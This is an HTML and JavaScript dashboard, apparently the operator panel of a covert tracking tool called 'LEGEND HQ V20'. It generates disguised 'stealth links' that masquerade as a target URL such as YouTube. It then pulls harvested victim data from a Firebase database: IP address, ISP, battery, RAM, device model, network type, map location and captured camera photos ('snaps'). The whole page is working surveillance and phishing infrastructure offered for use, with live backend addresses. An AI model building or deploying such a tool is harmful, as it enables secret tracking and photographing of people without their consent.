<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEGEND HQ V20</title>
    <style>
        body { background: #e0e5ec; font-family: 'Segoe UI', sans-serif; padding: 20px; color: #444; }
        .card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px #bec3c9, -20px -20px 60px #ffffff; margin-bottom: 20px; text-align: center; }
        h1 { color: #00a884; letter-spacing: 2px; font-size: 1.5rem; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #bec3c9, inset -6px -6px 12px #ffffff; margin-bottom: 15px; outline: none; box-sizing: border-box; }
        .btn-gen { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #00a884; color: white; font-weight: bold; box-shadow: 6px 6px 12px #bec3c9, -6px -6px 12px #ffffff; cursor: pointer; margin-bottom: 10px; }
        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bec3c9, -6px -6px 12px #ffffff; margin-top: 15px; font-size: 0.75rem; border-left: 8px solid #00a884; text-align: left; }
        .badge { background: #d1d9e6; padding: 4px 8px; border-radius: 8px; display: inline-block; margin: 2px; font-weight: bold; }
        .snap-img { width: 100%; border-radius: 15px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>LEGEND HQ V20</h1>
        <input type="text" id="k" placeholder="Secret Key (e.g. user1)">
        <input type="text" id="r" placeholder="Target URL (e.g. YouTube)">
        <button class="btn-gen" onclick="gen()">GENERATE STEALTH LINK</button>
        <div id="out" onclick="copy()" style="font-size: 0.7rem; color: #00a884; cursor: pointer; margin-top: 10px; word-break: break-all;"></div>
    </div>

    <div style="display: flex; gap: 10px;">
        <button class="btn-gen" style="background:#333;" onclick="show('tracking')">LOCATIONS</button>
        <button class="btn-gen" style="background:#cc0000;" onclick="show('photos')">SNAPS</button>
    </div>

    <div id="logs"></div>

    <script>
        const DB = "https://location-5d435-default-rtdb.firebaseio.com/";
        const PAGE = "https://video-obtg.vercel.app/"; // Naya Vercel URL yahan likhein

        function gen() {
            const k = document.getElementById('k').value, r = document.getElementById('r').value;
            if(!k || !r) return alert("Fill all!");
            const link = `${PAGE}#${btoa(JSON.stringify({k, r}))}`;
            document.getElementById('out').innerText = link;
            navigator.clipboard.writeText(link);
            alert("Link Copied!");
        }

        async function show(path) {
            const k = document.getElementById('k').value;
            const res = await fetch(`${DB}${path}/${k}.json`);
            const data = await res.json();
            const area = document.getElementById('logs'); area.innerHTML = "";
            if(!data) return;

            Object.keys(data).reverse().forEach(id => {
                const item = data[id];
                if(path === 'photos') {
                    area.innerHTML += `<div class="log-card" style="text-align:center;"><b>🕒 ${item.t}</b><img src="${item.p}" class="snap-img"></div>`;
                } else {
                    area.innerHTML += `<div class="log-card">
                        <b>🕒 ${item.time}</b><br>
                        <span class="badge">🌐 IP: ${item.ip}</span> <img src="${item.flag}" width="18"><br>
                        <span class="badge">📡 ISP: ${item.isp}</span><br>
                        <span class="badge">🔋 Bat: ${item.bat}</span> <span class="badge">🧠 RAM: ${item.ram}GB</span><br>
                        <span class="badge">📱 ${item.model}</span> <span class="badge">📶 ${item.net}</span><br>
                        <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:bold; text-decoration:none;">[ VIEW ON MAP ]</a>
                    </div>`;
                }
            });
        }
    </script>
</body>
</html>
